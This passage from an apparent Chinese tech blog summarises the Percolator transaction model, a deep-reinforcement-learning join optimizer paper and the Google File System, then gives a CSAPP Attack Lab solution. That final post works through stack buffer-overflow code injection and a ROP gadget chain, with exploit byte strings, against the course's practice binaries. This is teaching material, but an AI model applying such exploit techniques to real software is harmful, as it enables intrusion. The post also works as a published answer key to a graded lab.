<h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><p>相比 2PC 存在的问题，来看看 Percolator 事务模型有哪些改进。</p>
<ol>
<li><p>单点故障<br>Percolator 通过日志和异步线程的方式弱化了这个问题。一是，Percolator 引入的异步线程可以在事务管理器宕机后，回滚各个分片上的事务，提供了善后手段，不会让分片上被占用的资源无法释放。二是，事务管理器可以用记录日志的方式使自身无状态化，日志通过共识算法同时保存在系统的多个节点上。这样，事务管理器宕机后，可以在其他节点启动新的事务管理器，基于日志恢复事务操作。</p>
</li>
<li><p>数据不一致<br>2PC 的一致性问题主要缘自第二阶段，不能确保事务管理器与多个参与者的通讯始终正常。但在 Percolator 的第二阶段，事务管理器只需要与 primary 操作所在的一个节点通讯，这个 Commit 操作本身就是原子的。所以，事务的状态自然也是原子的，一致性问题被完美解决了。</p>
</li>
</ol>
<h2 id="Snapshot-Isolation"><a href="#Snapshot-Isolation" class="headerlink" title="Snapshot Isolation"></a>Snapshot Isolation</h2><p>传统关系型数据库中定义的隔离级别有4种（RU、RC、RR、S），而 Percolator 事务模型提供的隔离级别是快照隔离（Snapshot Isolation, SI），它也是与 MVCC 相辅相成的。SI的优点是：</p>
<ul>
<li>对于读操作，保证能够从时间戳/版本号指定的稳定快照获取，不会发生幻读</li>
<li>对于写操作，保证在多个事务并发写同一条记录时，最多只有一个会提交成功</li>
</ul>
<img src="/2021/02/09/Google-Percolator/7.jpg" style="zoom:100%;">

<p>如图，基于快照隔离的事务，开始于 start timestamp（图内为小空格），结束于 commit timestamp（图内为小黑球）。本例包含以下信息：</p>
<ol>
<li>txn_2 不能看到 txn_1 的提交信息，因为 txn_2 的开始时间戳 start timestamp 小于 txn_1 的提交时间戳 commit timestamp</li>
<li>txn_3 可以看到 txn_2 和 txn_1 的提交信息</li>
<li>txn_1 和 txn_2 并发执行：如果它们对同一条记录进行写入，至少有一个会失败</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>Peng D, Dabek F, Inc G . “Large-scale Incremental Processing Using Distributed Transactions and Notifications” (2010).</li>
</ol>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-07T04:30:57.000Z" title="2021-2-7 12:30:57">2021-02-07</time>发表</span><span class="level-item"><time dateTime="2021-02-07T05:46:51.801Z" title="2021-2-7 13:46:51">2021-02-07</time>更新</span><span class="level-item">13 分钟读完 (大约1885个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/">Learning to Optimize Join Queries With Deep Reinforcement Learning</a></h1><div class="content"><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>传统的多表 join 算法采用的是动态规划：</p>
<ol>
<li>从初始 query graph 开始</li>
<li>找到 cost 最少的 join</li>
<li>更新 query graph 直到只剩下一个节点。但这种贪心策略并不会保证一定会选到合适的 join order，因为它只直观表示了每个 join 的<code>短期cost</code>。例如：</li>
</ol>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/1.png" style="zoom:100%;">

<p>动态规划的结果 cost 为 140，而最优解的 cost 为 110。</p>
<p><a target="_blank" rel="noopener" href="https://arxiv.org/pdf/1808.03196.pdf">Learning to Optimize Join Queries With Deep Reinforcement Learning</a> 论文中将 join 问题表示为马尔可夫决策过程（MDP），然后构建了一个使用深度 Q 网络（DQN）的优化器，用来有效地优化 join 顺序。</p>
<h2 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h2><p>将连接排序表示为 MDP：</p>
<ul>
<li>状态G：a query graph</li>
<li>动作c：a join</li>
<li>下一个状态G’：join后的query graph</li>
<li>奖励J(c)：join的估算成本</li>
</ul>
<p>用 Q-Learning 算法来解决 join 顺序 MDP。在 Q-Learning 中最关键的是得到 Q 函数 Q(G,c)，它可以知道当前 query graph 中进行每个 join 的<code>长期cost</code>。如果我们可以访问真正的 Q(G,c)，就可以对传统的动态规划进行改进：</p>
<ol>
<li>从初始 query graph 开始</li>
<li>找到 Q(G,c) 值最小的 join</li>
<li>更新 query graph 直到只剩下一个节点，从而得到最优的 join order。实际上我们无法访问真正的 Q 函数，因此，我们需要训练一个神经网络，它接收 (G,c) 作为输入，并输出估算的 Q(G,c)。在论文中算法如下，给定query：</li>
</ol>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/2.png" style="zoom:100%;">

<h4 id="状态-G-和动作-c-的特征化"><a href="#状态-G-和动作-c-的特征化" class="headerlink" title="状态 G 和动作 c 的特征化"></a>状态 G 和动作 c 的特征化</h4><ol>
<li>query graph 中的每个关系的所有属性放入集合 A-G 中；join 左侧的所有属性放入集合 A-L 中；join 右侧的所有属性放入集合 A-R 中。并使用 1-hot 向量来编码。对于该例子，论文中表示如下：</li>
</ol>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/3.png" style="zoom:100%;">

<ol start="2">
<li>对于查询中的每个选择，我们可以获得 selectivity ∈ [0,1]（用来估计选择后存在的元组占选择前总元组的比例），我们需要根据 selectivity 的值去更新向量。例如：</li>
</ol>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/4.png" style="zoom:100%;">

<ol start="3">
<li>还可以根据在物理计划中选择的具体 join 算法去产生新的 1-hot 向量（例如，IndexJoin 为 [1 0], HashJoin 为 [0 1]）,与原向量进行串联，如下：</li>
</ol>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/5.png" style="zoom:100%;">

<p>根据在论文 2.5 节的假设：</p>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/6.png" style="zoom:100%;">

<p>在这里我们就可以知道 query graph 特征 fG 为 fG = AG，join 决策特征 fc 为 fc = A-L ⊕ A-R，对于一个特定的元组（G,c）特征化为 fG ⊕ fc。</p>
<h4 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h4><p>DQ 使用多层感知机（MLP）神经网络来表示 Q 函数。它以（G,c）的最终特征化 fG ⊕ fc 作为输入。在实验中发现，两层的 MLP 可以提供最佳表现。模型使用随机梯度下降算法进行训练。</p>
<h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><p>训练后，在原有基础上再对多表 join 算法进行改进：</p>
<ol>
<li>从初始 query graph 开始</li>
<li>使每个 join 特征化</li>
<li>找到模型估计的 Q 值最小的 join（即神经网络的输出）</li>
<li>更新 query graph 直到只剩下一个节点，从而得到最优的 join order。在执行过程中，还可以对 DQ 进行进一步微调。</li>
</ol>
<h2 id="Experiment-Result"><a href="#Experiment-Result" class="headerlink" title="Experiment Result"></a>Experiment Result</h2><p>论文中使用了 Join Order Benchmark（JOB） 来评估 DQ。这个数据库由来自 IMDB 的 21 个表组成，并提供了 33 个查询模板和 113 个查询。查询中的连接关系大小范围为 5 到 15 个。当连接关系的数量不超过 10 个时，DQ 从穷举中收集训练数据。</p>
<p>将 DQ 与几个启发式优化器（QuickPick 和 KBZ）以及经典动态规划（left-deep、right-deep、zig-zag）进行比较。对每个优化器生成的计划进行评分，并与最优计划（通过穷举获得）进行比较。<br>此外，论文中设计了 3 个成本模型：</p>
<ol>
<li>Cost Model 1（Index Mostly）：模拟内存数据库并鼓励使用索引连接</li>
<li>Cost Model 2（Hybrid Hash）：仅考虑具有内存预算的散列连接和嵌套循环连接</li>
<li>Cost Model 3（Hash Reuse）：考虑重用已构建的散列表</li>
</ol>
<p>进行了 4 轮交叉验证后，确保仅对未出现在训练工作负载中的查询进行 DQ 评估（对于每种情况，论文中在 80 个查询上训练并测试其中的 33 个）。计算查询的平均次优性，即“成本（算法计划）/ 成本（最佳计划）”，这个数字越低越好。例如，对 Const Model 1，DQ 平均距离最佳计划 1.32 倍。结果如下：</p>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/7.png" style="zoom:100%;">

<p>在所有成本模型中，DQ 在没有指数结构的先验知识的前提下可以与最优解决方案一比高下。对于固定的动态规划，情况并非如此：例如，left-deep 在 CM1 中产生了良好的计划，但在 CM2 和 CM3 中效果没有那么好。同样，right-deep在 CM1 中没有竞争力，但如果使用 CM2 或 CM3，right-deep 不是最差的。需要注意的是，基于学习的优化器比手动设计的算法更强大，可以适应工作负载、数据或成本模型的变化。</p>
<p>此外，DQ 以比传统动态规划快得多的速度产生了良好的计划：</p>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/8.png" style="zoom:100%;">

<p>对于最大的连接（15），DQ 的速度是穷举的 10000 倍，比 zig-zag 快 1000 倍，比 left-deep 和 right-deep 快 10 倍。</p>
<h2 id="Future-work"><a href="#Future-work" class="headerlink" title="Future work"></a>Future work</h2><p><strong>本文研究中存在的不足：</strong></p>
<ol>
<li>奖励值（即J(c)）依赖于数据库系统的代价模型，当代价估计错误时，算法的 join 计划无法达到最优</li>
<li>需要大量的 query 进行训练，估计的 Q 函数的值才能趋向稳定</li>
</ol>
<p><strong>可以拓展的思路：</strong><br>同样使用强化学习，参考于 <a target="_blank" rel="noopener" href="https://arxiv.org/pdf/1901.05152.pdf">SkinnerDB: Regret-Bounded Query Evaluation via Reinforcement Learning</a>，一条 join query 的执行框架如下：</p>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/9.png" style="zoom:100%;">

<p>查询时，Pre-Processor 首先通过一元谓词过滤基表，接着由 Join Processor 生成查询的连接顺序与执行结果，最后调用 Post-Processor 对结果进行分组、聚合与排序等操作。</p>
<p>Join Processor 包括 4 部分，Join Processor 将每个连接操作分为多个时间片，每个时间片首先由 Learning Optimizer 选择连接顺序，选中的连接顺序由特定的 Join Executor 执行，每次执行固定时长，并将执行结果加入结果集中。Progress Tracker 跟踪被处理的数据，最后由 Reward Calcultor 计算连接顺序的得分。当所有数据被连接后，完成连接操作。学习优化器使用强化学习领域的上限置信区间算法（UCT），在每个时间片中根据连接顺序的枚举空间生成搜索树，并选择一条路径。UCT 算法的特点即不依赖任何具体示例的参数设置，能够适用于较大的搜索空间。</p>
<p>该算法不需要任何查询上下文及 Cardinality 估计模型。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-30T07:26:08.000Z" title="2021-1-30 15:26:08">2021-01-30</time>发表</span><span class="level-item"><time dateTime="2021-01-30T10:29:08.513Z" title="2021-1-30 18:29:08">2021-01-30</time>更新</span><span class="level-item">12 分钟读完 (大约1868个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/30/Google-File-System/">Google File System</a></h1><div class="content"><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>GFS 是 Google 针对大数据处理场景设计的分布式文件系统，Google 对数据量的持续增长的设想如下：</p>
<ul>
<li>需要能够运行在经常故障的物理机环境上。只有做到这点，这个系统才能运行在几百到上千台规模下，并采用相对便宜的服务器硬件</li>
<li>大文件居多。存储在 GFS 上的文件的不少都在几个 GB 这样的级别</li>
<li>大多数写是append写，即在文件末尾追加</li>
<li>性能主要考量是吞吐而不是延时</li>
</ul>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>GFS 以目录树的形式组织文件，但是并没有提供类似 POSIX 标准的文件系统操作。操作只要包含 create, open, write, read, close, delete, append, snapshot，其中 snapshot 用于快速复制一个文件或者目录，允许多个客户端并行追加数据到一个文件。</p>
<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>整体架构上，GFS 由单一的 master 节点、chunkserver 和提供给用户的 client 三大部分组成：</p>
<img src="/2021/01/30/Google-File-System/gfs.png" style="zoom:100%;">

<p>client 与 chunkserver 都不会缓存文件数据，为的是防止数据出现不一致的状况，但是 client 会缓存 metadata 的信息。</p>
<h3 id="master"><a href="#master" class="headerlink" title="master"></a>master</h3><p>一方面存储所有的 metadata，负责管理所有的元信息，包括表示文件系统目录结构的 namespace、访问控制信息、文件与 chunk 的映射关系、chunk 的位置信息；另一方面管理 chunk 租约、chunk 迁移(如果 chunkserver 挂掉)、维护与 chunkserver 之间的心跳。</p>
<ul>
<li>namespace 采用全内存的数据结构，以提高访问的吞吐</li>
<li>namespace 是一个查找表(lookup table)，并且采用了前缀压缩的方式存储在内存中，它是一个树结构，树中每一个节点(文件名或目录名)都有一个读/写锁。在对文件或目录操作的时候需要获取锁，例如修改 <code>/root/foo/bar</code>，需要获得 <code>/root</code>、<code>/root/foo</code> 的读锁，<code>/root/foo/bar</code> 的写锁</li>
<li>master 本身并不记录 chunk 的位置，而是在启动的时候，通过收取 chunkserver 的信息来构建。这种设计避免了 master 和 chunkserver 的信息不一致的问题(因为以 chunkserver 为准)</li>
<li>master 和 chunkserver 通过定期心跳来保持信息同步、感知 chunkserver 故障等</li>
<li>master 往磁盘上写操作日志，并将这些日志同步到其他物理机保存的方式来确保数据安全性。当前 master 机器故障的时候，可以通过这些日志和 chunkserver 的心跳内容，可以恢复到故障前的状态</li>
<li>对于操作日志，会定期在系统后台执行 checkpoint；checkpoint 构建成一个类似B+树、可以快速的 load 到内存中直接使用的结构</li>
<li>master 需要定期检查每个 chunk 的副本情况，如果副本低于配置值，就需要将通知 chunkserver 进行复制；如果存在一些多余的 chunk (file 已经被删除了)，就需要做一些清理工作</li>
</ul>
<h3 id="chunkserver"><a href="#chunkserver" class="headerlink" title="chunkserver"></a>chunkserver</h3><p>每个 chunk 有一个 64 位标识符(chunk handle)，它是在 chunk 被创建时由 master 分配的，每一个 chunk 会有多个副本，分别在不同的机器上，每个副本会以 Linux 文件的形式存储在 chunkserver 的本地磁盘上。<br>GFS 中将 chunk 的大小定为 64 MB，它比一般的文件系统的块大小要大。优点：减少 metadata 的数量、减少 client 与 master 的交互、client 可以在一个 chunk 上执行更多的操作，通过 TCP 长连接减少网络压力；缺点：如果在一个 chunk 上有一个可执行文件，同时有许多 client 都要请求执行这个文件，它的压力会很大。<br>chunk 的位置信息在 master 中不是一成不变的，master 会通过定期的 heartbeat 进行更新，这样做能够减小开销，这样做就不用 master 与 chunkserver 时刻保持同步通信(包括 chunkserver 的加入、退出、改名、宕机、重启等)。chunkserver 上有一个 final word，它表示了哪个 chunk 在它的磁盘上，哪个 chunk 不在。</p>
<h2 id="一致性模型"><a href="#一致性模型" class="headerlink" title="一致性模型"></a>一致性模型</h2><img src="/2021/01/30/Google-File-System/consistency.png" style="zoom:100%;">

<blockquote>
<p>defined：状态已定义，从客户端角度来看，客户端完全了解已写入集群的数据<br>consistent：客户端来看chunk多副本的数据完全一致，但不一定defined</p>
</blockquote>
<ul>
<li>串行写：客户端自己知道写入文件范围以及写入数据内容，且本次写入在数据服务器的多副本上均执行成功，每个客户端的写操作串行执行，因此最终结果是 <code>defined</code></li>
<li>并行写：每次写入在数据服务器的多副本上均执行成功，所以结果是 <code>consistent</code>，但客户端无法得知写操作的执行顺序，即使每次操作都成功，客户端无法确定在并发写入时交叉部分，所以是 <code>undefined</code></li>
<li>追加写：客户端能够根据 offset 确切知道写入结果，无论是串行追加还是并发追加，其行为是 <code>defined</code>，追加时至少保证一次副本写成功，如果存在追加失败，则多个副本之间某个范围的数据可能不一致，因此是 <code>interspersed with inconsistent</code>。</li>
</ul>
<h2 id="GFS-租约"><a href="#GFS-租约" class="headerlink" title="GFS 租约"></a>GFS 租约</h2><p>GFS 使用租约机制 (lease) 来保障 mutation (指的是改变了 chunk 的内容或者 metadata，每一次 mutation 都应该作用于所有的备份) 的一致性：多个备份中的一个持有 lease，这个备份被称为 primary replica (其余的备份为 secondary replicas)，GFS 会把所有的 mutation 都序列化(串行化)，让 primary 执行，secondary 也按相同顺序执行，primary 是由 master 选出来的，一个 lease 通常 60 秒会超时。</p>
<h2 id="写流程"><a href="#写流程" class="headerlink" title="写流程"></a>写流程</h2><img src="/2021/01/30/Google-File-System/write.png" style="zoom:100%;">

<ol>
<li>client 向 master 请求持有 lease 的 chunk (primary replica) 位置和其他 replicas 的位置(如果没有 chunk 持有 lease，那么 master 会授予其中一个 replica 一个 lease)</li>
<li>master 返回 primary 的信息和其他 replicas 的位置，然后 client 将这些信息缓存起来(只有当 primary 无法通信或者该 primary replica 没有 lease 了，client 才会向 master 再次请求)</li>
<li>client 会将数据发送到所有的 replicas，每个 chunkserver 会把数据存在 LRU 缓存中</li>
<li>在所有的 replicas 都收到了数据之后，client 会向 primary 发送写请求。primary 会给它所收到的所有 mutation 分配序列号(这些 mutation 有可能不是来自于同一个 client)，它会在自己的机器上按序列号进行操作</li>
<li>primary 给 secondaries 发送写请求，secondaries 会按相同的序列执行操作</li>
<li>secondaries 告知 primary 操作执行完毕</li>
<li>primary 向 client 应答，期间的错误也会发送给 client，client 错误处理程序 (error handler) 会重试失败的 mutation</li>
</ol>
<h2 id="读流程"><a href="#读流程" class="headerlink" title="读流程"></a>读流程</h2><ol>
<li><p>client 向 master 发出 A 文件的读请求</p>
</li>
<li><p>master 收到后返回 A 文件的 chunk handler 和 chunk 的位置</p>
</li>
<li><p>client 携带 chunk handle 以及位偏移向对应的 chunkserver 发出请求</p>
</li>
<li><p>chunkserver 读取并返回数据至 client</p>
</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>Ghemawat, Sanjay, Howard Gobioff, and Shun-Tak Leung. “The Google file system.” (2003).</li>
</ol>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-21T07:00:00.000Z" title="2021-1-21 15:00:00">2021-01-21</time>发表</span><span class="level-item"><time dateTime="2021-01-21T07:55:32.763Z" title="2021-1-21 15:55:32">2021-01-21</time>更新</span><span class="level-item">10 分钟读完 (大约1528个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/21/Attack-Lab/">Attack Lab</a></h1><div class="content"><p><code>本文记录 CSAPP 的 Attack Lab 完成方案。</code></p>
<h2 id="1-ctarget-部分"><a href="#1-ctarget-部分" class="headerlink" title="1. ctarget 部分"></a>1. ctarget 部分</h2><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p><code>level 1</code> 要求我们在 <code>getbuf</code> 输入字符串后，利用溢出来重写栈中 <code>getbuf</code> 函数返回的地址，让函数调用 <code>touch1</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000401713 &lt;getbuf&gt;:</span><br><span class="line">  401713:	48 83 ec 38          	sub    $0x38,%rsp</span><br><span class="line">  401717:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  40171a:	e8 3b 02 00 00       	callq  40195a &lt;Gets&gt;</span><br><span class="line">  40171f:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401724:	48 83 c4 38          	add    $0x38,%rsp</span><br><span class="line">  401728:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>根据这段汇编代码我们可以确定，<code>getbuf</code> 在栈中分配了0x38比特的内存来存储输入的字符串。如果我们输入的字符串长度超过 56，就可以覆盖掉 <code>getbuf</code> 的返回地址了，所以，我们只需要把输入的第 56-63 个字符填写为 <code>touch1</code> 函数的地址就行了。<br>需要注意的是，我们输入的字符应该用两位十六进制数来表示，然后通过 <code>hex2raw</code> 来将其转换成字符串。另外，我这里数据都是用小端法来保存的，所以低位在前：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">29 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p><code>level 2</code> 要求我们注入我们自己写的代码，并把程序转移到我们写的代码处运行，也就是执行 <code>touch2</code>。<br>如何通过我们的代码跳转到 <code>touch2</code> 函数？<br>首先，我们需要找到缓冲区的起始地址，在 <code>getbuf</code> 处打断点，查看 <code>$rsp</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p $rsp</span><br><span class="line">$1 &#x3D; (void *) 0x5565fd40</span><br></pre></td></tr></table></figure>
<p>可以知道，<code>0x5565fd40 - 0x38 = 0x5565fd08</code> 就是缓冲区的起始地址，我们需要和前面的 <code>level 1</code> 一样，让缓冲区溢出，56-63 个字符填写为缓冲区的起始地址，另外在缓冲区的起始处注入我们自己写的代码，这样程序才能执行我们想要的结果。<br>我们注入的代码逻辑应该是：</p>
<ul>
<li>将 <code>cookie</code> 值赋给 <code>%edi</code> 作为 <code>touch2</code> 函数的参数</li>
<li>将 <code>touch2</code> 函数的地址入栈</li>
<li>ret，让函数执行 <code>touch2</code></li>
</ul>
<p>转为汇编就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x2a2e4a08, %edi</span><br><span class="line">pushq $0x0000000000401755</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>这里需要用到 <code>gcc</code> 内联汇编的方法，编写 <code>level2.c</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	asm</span><br><span class="line">	(</span><br><span class="line">	 &quot;movl $0x2a2e4a08, %edi\n\t&quot;</span><br><span class="line">	 &quot;pushq $0x0000000000401755\n\t&quot;</span><br><span class="line">	 &quot;ret&quot;</span><br><span class="line">	);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译并查看其反汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc level2.c -o level2.out</span><br><span class="line">objdump -d level2.out </span><br></pre></td></tr></table></figure>
<p>可以看到我们想要的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4004f1:       bf 08 4a 2e 2a          mov    $0x2a2e4a08,%edi</span><br><span class="line">4004f6:       68 55 17 40 00          pushq  $0x401755</span><br><span class="line">4004fb:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>那么我们在缓冲区注入字符就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bf 08 4a 2e 2a 68 55 17 </span><br><span class="line">40 00 c3 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">08 fd 65 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p><code>level 3</code> 要求我们执行 <code>touch3</code>，<code>touch3</code> 接收的参数是 <code>cookie</code> 的字符串的地址。<br>有了 <code>level 2</code> 的经验，我们知道需要在 56-63 个字符填写缓冲区的起始地址，另外在缓冲区的起始处注入我们自己写的代码。我们把 <code>cookie</code> 字符串放在第 64-71 个字符，这样，我们注入的代码就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5565fd48, %edi</span><br><span class="line">pushq $0x0000000000401829</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p><code>0x5565fd08 + 64 = 0x5565fd48</code> 是 <code>cookie</code> 字符串的地址，<code>0x0000000000401829</code> 是 <code>touch3</code> 函数地址。同样地，用 <code>gcc</code> 内联汇编的方法得到汇编代码，最终我们在缓冲区注入字符就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bf 48 fd 65 55 68 29 18 </span><br><span class="line">40 00 c3 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">08 fd 65 55 00 00 00 00</span><br><span class="line">32 61 32 65 34 61 30 38</span><br></pre></td></tr></table></figure>

<h2 id="2-rtarget-部分"><a href="#2-rtarget-部分" class="headerlink" title="2. rtarget 部分"></a>2. rtarget 部分</h2><h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>与之前的 <code>level 2</code> 相同，我们需要为 <code>%rdi</code> 赋上 <code>cookie</code> 值，再跳转到 <code>touch2</code> 函数执行，跳转到 <code>touch2</code> 只需要将 <code>touch2</code> 的入口地址放在最后一个 <code>gadget</code> 之后，在它的 <code>ret</code> 指令执行之后就会返回到 <code>touch2</code> 中。<br>查看 <code>farm.s</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">000000000000001b &lt;getval_188&gt;:</span><br><span class="line">  1b:	b8 3c cd 58 c3       	mov    $0xc358cd3c,%eax</span><br><span class="line">  20:	c3                   	retq  </span><br></pre></td></tr></table></figure>
<p><code>58 c3</code> 对应 <code>popq %rax</code>，这条指令的地址是 <code>0x1b + 3 = 0x1e</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000000028 &lt;setval_279&gt;:</span><br><span class="line">  28:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)</span><br><span class="line">  2e:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p><code>48 89 c7 c3</code> 对应 <code>movq %rax,%rdi</code>，这条指令的地址是 <code>0x28 + 2 = 0x30</code>。<br>再查看 <code>rtarget.s</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004018b1 &lt;start_farm&gt;:</span><br><span class="line">  4018b1:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4018b6:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p><code>start_farm</code> 的起始地址是 <code>0x4018b1</code>。所以 <code>popq %rax</code> 这条指令最终的地址是 <code>0x1e + 0x4018b1 = 0x4018cf</code>；所以 <code>movq %rax,%rdi</code> 这条指令最终的地址是 <code>0x30 + 0x4018b1 = 0x4018e1</code>。<br><code>level 2(rtarget)</code> 最终结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">cf 18 40 00 00 00 00 00 &#x2F;* popq %rax *&#x2F;</span><br><span class="line">08 4a 2e 2a 00 00 00 00 &#x2F;* 将 cookie 存入 %rax *&#x2F;</span><br><span class="line">e1 18 40 00 00 00 00 00 &#x2F;* movq %rax,%rdi *&#x2F;</span><br><span class="line">55 17 40 00 00 00 00 00 &#x2F;* 返回到 touch2 *&#x2F;</span><br></pre></td></tr></table></figure>
